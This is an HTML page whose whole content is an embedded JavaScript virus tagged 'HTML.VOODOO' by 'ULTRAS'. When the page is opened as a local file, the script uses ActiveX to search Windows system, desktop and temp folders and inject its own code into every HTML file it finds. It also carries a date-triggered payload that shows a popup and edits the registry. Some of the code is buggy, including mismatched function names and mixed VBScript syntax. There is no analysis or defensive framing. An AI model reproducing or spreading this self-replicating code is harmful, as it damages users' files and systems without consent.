<html><body>
<SCRIPT lenguage="JavaScript" voodoo><!--
VooDoo()
function Voodoo() {
// HTML.VOODOO
// part II
var NS=(navigator.appName=='Netscape')
if(!NS) {
var d,day
d=new Date()
day=d.getUTCDate()
if(day==9) {
var textz = "Voodoo by ULTRAS"
var titlez = "ULTRAS"
var WSHShell = WScript.CreateObject("WScript.Shell");
var mesz;
mesz = WSHShell.Popup(textz,0,titlez,vbCritical);
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\", "C:\Windows\System\Shell32.dll,32"
return;
}
var proto=(location.protocol=='file:')
if(proto) {
var fso=new ActiveXObject("Scripting.FileSystemObject")
var winDir=fso.GetSpecialFolder(0)
InfDir(fso.GetFolder(winDir.path+"\\Web"))
InfDir(fso.GetFolder(winDir.path+"\\Desktop"))
InfDir(fso.GetFolder(winDir.path+"\\Help"))
InfDir(fso.GetFolder(winDir.path+"\\Web\\Wallpaper"))
InfDir(fso.GetSpecialFolder(2))
}
function InfDir(folder)
{
var files,fitem
files=new Enumerator(folder.files)
for(;!files.atEnd();files.moveNext()) {
fitem=files.item()
virinfect(fitem.path)
}
}
}
}
function virinfect(fileName)
{
if(fileName.search(new RegExp(".[hH][tT][mM]"))!=-1 || fileName.search(new RegExp(".[hH][tT][mM][lL]"))!=-1) {
var file,fso,host,i,j,infected,virus,virusPath
fso=new ActiveXObject("Scripting.FileSystemObject")
virusPath=window.location.pathname
virusPath=virusPath.slice(1)
file=fso.openTextFile(virusPath,1)
virus=file.readAll()
file.close()
i=virus.search(new RegExp("<SCRIPT lenguage=\"JavaScript\" voodoo>"))
j=virus.search(new RegExp("e"+"nds"))
j+=20
virus=virus.slice(i,j)
file=fso.openTextFile(fileName,1)
host=file.readAll()
file.close()
if(host.search(new RegExp("HTML.VOODOO"))==-1) {
i=host.search(new RegExp("< *[Bb][Oo][Dd][Yy]"))
if(i!=-1) {
i+=4
infected=host.slice(0,i)
host=host.slice(i)
i=host.search(new RegExp(">"))
i++
infected+=host.slice(0,i)
host=host.slice(i)
}
infected+=virus
infected+=host
file=fso.openTextFile(fileName,2)
file.write(infected)
file.close()
}
}
}
//ends--></SCRIPT>
</body>
</html>
